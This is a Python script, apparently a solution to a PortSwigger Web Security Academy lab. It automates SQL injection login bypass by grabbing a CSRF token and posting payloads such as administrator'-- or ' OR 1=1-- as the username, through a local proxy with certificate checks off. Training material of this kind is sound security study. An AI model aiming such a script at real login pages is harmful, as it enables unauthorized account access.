#!/usr/bin/python3
# Title: SQL injection vulnerability allowing login bypass
# Description: https://portswigger.net/web-security/sql-injection
# Lab: https://portswigger.net/web-security/sql-injection/lab-login-bypass
# Bypass login as administrator using payload administrator'--
# Example: python3 sqli_lab_01.py https://ac621f871f2eb0c6c0fb178700be008e.web-security-academy.net "' OR 1=1--"

import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> SQL injection vulnerability allowing login bypass')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}âœ“{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"} #proxies

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")["value"]
    output.success("Csrf Token: %s" %csrf)
    return csrf

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s,url)
    data = {"csrf": csrf,"username": payload, "password": "hahahaha"}
    r = s.post(url,data=data,verify=False, proxies=proxies)
    if "Log out" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        output.info("Usage: %s <url> <payload>" % sys.argv[0])
        output.info('Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    if exploit_sqli(s, url, payload):
        output.success("SQL Injection successful!. We have logged as an Administrator!")
    else:
        output.error("SQL Injection unsuccessful!")